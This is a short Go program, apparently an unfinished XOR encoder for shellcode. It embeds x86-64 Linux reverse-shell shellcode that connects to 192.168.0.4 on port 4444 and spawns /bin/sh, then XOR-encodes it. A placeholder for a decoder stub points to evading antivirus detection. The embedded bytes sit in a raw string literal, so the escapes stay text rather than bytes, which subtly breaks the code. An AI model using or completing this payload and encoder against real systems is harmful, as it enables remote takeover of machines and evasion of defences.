package main

import (
	"fmt"
)

// TODO: Replace this for a file descriptor, read input from a binary file
var HardcodedInput = []byte(`
	\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48
	\x97\x48\xb9\x02\x00\x11\x5c\xc0\xa8\x00\x04\x51\x48
	\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e
	\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58
	\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48
	\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05`)

func main() {
	// TODO: Read file here
	fmt.Printf("Input hex: %v\n", HardcodedInput)
	key := []byte("\x50")

	encodedOutput, err := encode(HardcodedInput, key)
	if err != nil {
		fmt.Printf("[ERROR]: An error ocurred while encoding %v\n", err)
	}
	fmt.Printf("[RESULT ENCODE]: %v \n", encodedOutput)

	decodedOutput, err := encode(encodedOutput, key)
	if err != nil {
		fmt.Printf("[ERROR]: An error ocurred while decoding %v\n", err)
	}
	fmt.Printf("[RESULT DECODE]: %v \n", decodedOutput)

}

func encode(input []byte, key []byte) ([]byte, error) {
	output := []byte{}
	for i, bytecode := range input {
		//fmt.Printf("encoding hex input[%d]: %v \n", i, bytecode)
		// let's just do a XOR encoder first
		keyByte := key[i%len(key)] // this makes keylenght variable
		encodedBytecode := bytecode ^ keyByte
		//fmt.Printf("encoded hex input[%d] to %v using key %v\n", i, encodedBytecode, keyByte)
		output = append(output, encodedBytecode)
	}
	return output, nil
}

func prependDecoderStub() {
	// TODO: encoded shellcode => encoded shellcode + appended decoder stub
}
